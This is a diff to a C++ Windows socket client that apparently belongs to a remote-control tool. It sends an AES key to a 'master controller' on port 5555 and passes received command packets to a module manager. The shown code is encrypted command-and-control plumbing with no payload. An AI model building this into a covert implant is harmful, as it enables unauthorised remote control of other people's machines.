@@ -10,20 +10,27 @@
 #define SERVER_PORT 5555;
 
 
-CSocketClient::CSocketClient() : m_pClient(this) {
-	// 设置数据包最大长度（有效数据包最大长度不能超过0x3FFFFF字节(4MB-1B)，默认：262144/0x40000 (256KB)
-	m_pClient->SetMaxPackSize(PACKET_MAX_LENGTH);
-	// 设置心跳检测包发送间隔
-	m_pClient->SetKeepAliveTime(60 * 1000);
-	// 设置心跳检测重试包发送间隔
-	m_pClient->SetKeepAliveInterval(20 * 1000);
-
+CSocketClient::CSocketClient(CSocketClient* pMainSocketClient /* = nullptr*/) : m_pTcpPackClient(this) {
+	
 	m_dwClientStatus = NOT_ONLINE;
+
+	m_bIsMainSocketClient = (pMainSocketClient == nullptr) ? true : false;
+
+	m_pMainSocketClient = m_bIsMainSocketClient ? this : pMainSocketClient;
+
+	//// 设置数据包最大长度（有效数据包最大长度不能超过0x3FFFFF字节(4MB-1B)，默认：262144/0x40000 (256KB)
+	//m_pTcpPackClient->SetMaxPackSize(PACKET_MAX_LENGTH);
+	//// 设置心跳检测包发送间隔
+	//m_pTcpPackClient->SetKeepAliveTime(60 * 1000);
+	//// 设置心跳检测重试包发送间隔
+	//m_pTcpPackClient->SetKeepAliveInterval(20 * 1000);
 }
 
 
 CSocketClient::~CSocketClient() {
-
+	if (m_bIsMainSocketClient) {
+		delete m_pModuleManage;
+	}
 }
 
 
@@ -33,12 +40,19 @@ BOOL CSocketClient::StartSocketClient() {
 	WORD wPort = SERVER_PORT;
 	BOOL bRet;
 
-	if (!(m_pClient->IsConnected())) {
-		bRet = m_pClient->Start(lpszRemoteAddress, wPort, 0);		// 默认是异步connect，bRet返回true不一定代表成功连接。坑死我了
+	if (!(m_pTcpPackClient->IsConnected())) {
+		bRet = m_pTcpPackClient->Start(lpszRemoteAddress, wPort, 0);		// 默认是异步connect，bRet返回true不一定代表成功连接。坑死我了
 		if (!bRet) {
 			return false;
 		}
-	}	
+	}
+
+	m_hChildSocketClientExitEvent = CreateEvent(NULL, true, false, NULL);
+
+	// 组件管理对象
+	if (m_bIsMainSocketClient) {
+		m_pModuleManage = new CModuleManage(this);
+	}
 
 	// 生成随机密钥
 	BYTE pbKey[16];
@@ -47,14 +61,18 @@ BOOL CSocketClient::StartSocketClient() {
 	RandomBytes(pbIv, 16);
 	m_Crypto = CCrypto(AES_128_CFB, pbKey, pbIv);
 
+
+	BYTE pbKeyAndIv[CRYPTO_KEY_PACKET_LENGTH];
+	// 第一个字节表示是主socket的密钥还是子socket的密钥
+	pbKeyAndIv[0] = (m_bIsMainSocketClient) ? CRYPTO_KEY_PACKET_TOKEN_FOR_MAIN_SOCKET : CRYPTO_KEY_PACKET_TOKEN_FOR_CHILD_SOCKET;
+	memcpy(pbKeyAndIv + 1, pbKey, 16);
+	memcpy(pbKeyAndIv + 17, pbIv, 16);
+
 	// 向主控端发送密钥
-	BYTE pbKeyAndIv[32];
-	memcpy(pbKeyAndIv, pbKey, 16);
-	memcpy(pbKeyAndIv + 16, pbIv, 16);
-	bRet = m_pClient->Send(pbKeyAndIv, 32);
+	bRet = m_pTcpPackClient->Send(pbKeyAndIv, CRYPTO_KEY_PACKET_LENGTH);
 	if (bRet) {
 		printf("成功向服务器发送通信密钥:\n");
-		PrintData(pbKeyAndIv, 32);
+		PrintData(pbKeyAndIv, CRYPTO_KEY_PACKET_LENGTH);
 	}
 
 	return bRet;
@@ -62,12 +80,17 @@ BOOL CSocketClient::StartSocketClient() {
 
 
 BOOL CSocketClient::SendPacket(COMMAND_ID dwCommandId, PBYTE pbPacketBody, DWORD dwPacketBodyLength) {
-	CPacket Packet = CPacket(&m_Crypto);
+	CPacket Packet = CPacket(this);
 	Packet.PacketCombine(dwCommandId, pbPacketBody, dwPacketBodyLength);
-	BOOL bRet = m_pClient->Send(Packet.m_pbPacketCiphertext, Packet.m_dwPacketLength);
+	BOOL bRet = m_pTcpPackClient->Send(Packet.m_pbPacketCiphertext, Packet.m_dwPacketLength);
 	return bRet;
 }
 
+
+// 写的时候只是用于阻塞子socket的退出。
+void CSocketClient::WaitForExitEvent() {
+	WaitForSingleObject(m_hChildSocketClientExitEvent, INFINITE);
+}
 
 
 
@@ -109,10 +132,10 @@ EnHandleResult CSocketClient::OnReceive(ITcpClient* pSender, CONNID dwConnID, co
 
 	PrintData((PBYTE)pData, iLength);
 
-	CPacket Packet = CPacket(&m_Crypto);
-	Packet.PacketParse((PBYTE)pData, iLength);
+	CPacket* pPacket = new CPacket(this);				// TODO 还没找到好的delete的时机
+	pPacket->PacketParse((PBYTE)pData, iLength);
 	
-	switch (Packet.m_PacketHead.wCommandId) {
+	switch (pPacket->m_PacketHead.wCommandId) {
 
 	case CRYPTO_KEY:		// Server接收到Client发出的密钥后，给Client响应一个CRYPTO_KEY包。然后Client发出上线包
 
@@ -131,14 +154,20 @@ EnHandleResult CSocketClient::OnReceive(ITcpClient* pSender, CONNID dwConnID, co
 
 	case ECHO:
 		printf("接收到ECHO测试包，明文内容如下：\n");
-		PrintData(Packet.m_pbPacketBody, Packet.m_dwPacketBodyLength);
+		PrintData(pPacket->m_pbPacketBody, pPacket->m_dwPacketBodyLength);
 
 		// 再把这个明文发回给主控端（即服务端），以完成ECHO测试
-		SendPacket(ECHO, Packet.m_pbPacketBody, Packet.m_dwPacketBodyLength);
+		SendPacket(ECHO, pPacket->m_pbPacketBody, pPacket->m_dwPacketBodyLength);
+		break;
+
+
+	default:					// 剩下的封包都是组件相关的封包，传个CModuleManage对象
+		m_pModuleManage->OnReceivePacket(pPacket);
 		break;
 	}
 
-	 
+
+	delete pPacket;
 
 	return HR_OK;
 }
